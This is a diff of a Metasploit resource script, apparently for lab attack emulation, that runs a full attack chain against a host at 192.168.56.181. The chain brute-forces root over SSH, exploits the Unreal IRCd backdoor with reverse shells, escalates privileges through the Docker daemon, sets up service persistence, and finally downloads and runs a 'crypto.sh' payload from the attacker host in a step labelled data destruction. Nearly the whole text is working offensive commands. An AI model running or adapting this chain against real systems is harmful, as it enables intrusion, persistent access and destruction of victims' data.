@@ -2,99 +2,67 @@
 # STEP 1 - SSH Brute Force
 # ============================================================
 
-sleep 15
-
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.56.181
 set RPORT 22
 set USERNAME root
-set PASS_FILE /home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt
-set STOP_ON_SUCCESS true
-set CreateSession true
-
+set PASS_FILE /home/ahnafrr/Desktop/msf/unix_passwords_modified.txt
 run
-sleep 15
 
 # ============================================================
 # STEP 2 - Unreal IRCd 3281 Backdoor
 # ============================================================
 
 use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS 192.168.56.181
-set RPORT 6697
 set PAYLOAD cmd/unix/reverse_perl
 set LHOST 192.168.56.191
 set LPORT 4444
-
+set RHOSTS 192.168.56.181
+set RPORT 6697
+set ForceExploit true
 exploit -j
-sleep 15
 
 # ============================================================
 # STEP 3 - Docker Daemon Privilege Escalation
 # ============================================================
 
 use exploit/linux/local/docker_daemon_privilege_escalation
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
 set SESSION 1
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set LHOST 192.168.56.191
-set LPORT 4445
-
-run
-sleep 15
+set LPORT 4444
+set PayloadLinuxMinKernel 3.17
+set ForceExploit true
+exploit -j
 
 # ============================================================
 # STEP 4 - Service Persistence
 # ============================================================
 
-use post/multi/manage/shell_to_meterpreter
-set SESSION 1
-
-run
-sleep 15
-sleep 20
-
-# ============================================================
-# STEP 5 - Service Persistence
-# ============================================================
-
 use exploit/linux/local/service_persistence
-set SESSION 2
 set PAYLOAD cmd/unix/reverse_python
+set SESSION 2
 set LHOST 192.168.56.191
-set LPORT 4446
-set VERBOSE true
+set LPORT 4444
+set VERBOSE True
+exploit -j
 
-run -j
-sleep 15
-
-# ============================================================
-# STEP 6 - Kill Session 2 and 3
-# ============================================================
-
-sessions -k 2
-sessions -k 3
-sleep 10
-sleep 20
+sessions -k 2,3
 
 # ============================================================
-# STEP 7 - Reverse Handler
+# STEP 5 - Multi Handler
 # ============================================================
 
 use exploit/multi/handler
 set PAYLOAD cmd/unix/reverse_python
-set LHOST 192.168.56.191
-set LPORT 4446
-set ExitOnSession false
-exploit -j -z
-
-sleep 15
-sleep 20
+set LHOST 192.168.56.191 
+exploit -j
 
 # ============================================================
-# STEP 8 - 
+# STEP 6 - Data Destruction for Impact
 # ============================================================
 
-sessions -l
-sessions -c "wget --no-check-certificate http://192.168.56.191/downloads/crypto.sh" -i 4
-sessions -c "chmod 755 ./crypto.sh" -i 4
-sessions -c "timeout 60s ./crypto.sh &" -i 4
+sessions -i 4
+wget --no-check-certificate http://192.168.56.191:8000/downloads/crypto.sh
+chmod 755 ./crypto.sh
+timeout 60s ./crypto.sh &
